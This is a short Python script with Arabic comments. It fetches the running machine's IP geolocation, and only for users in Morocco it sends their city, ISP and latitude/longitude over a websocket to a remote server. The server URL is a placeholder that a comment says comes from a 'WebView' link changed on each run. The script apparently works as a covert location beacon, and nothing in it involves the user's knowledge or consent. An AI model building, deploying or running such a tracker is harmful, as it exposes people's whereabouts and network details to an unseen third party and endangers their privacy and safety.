import requests
import json
import asyncio
import websockets

# هنا نضع الرابط الذي يظهر في شاشة الـ WebView (قم بتغييره عند كل تشغيل جديد)
SERVER_WS = "ضع_هنا_رابط_الـ_WS_الذي_سيظهر_في_السيرفر"

def get_ip_info():
   r = requests.get("https://ipinfo.io/json",timeout=5)
   return r.json()

def is_morocco(info):
    return info.get("country") == "MA"

async def send(datainfo):
    async with websockets.connect(SERVER_WS) as ws:
        await ws.send(json.dumps(datainfo))

def main():
    info = get_ip_info()
    if not is_morocco(info):
        print('[-] user not in morocco')
        return
    lat, lon = map(float,info["loc"].split(","))
    datainfo = {
        "country":"MA",
        "city":info.get("city"),
        "org":info.get("org"),
        "lat":lat,
        "lon":lon
    }
    try:
        asyncio.run(send(datainfo))
        print("[+] Sended via WebView Link!")
    except Exception as e:
        print(f"[-] Connection Failed: {e}")

if __name__ == "__main__":
    main()
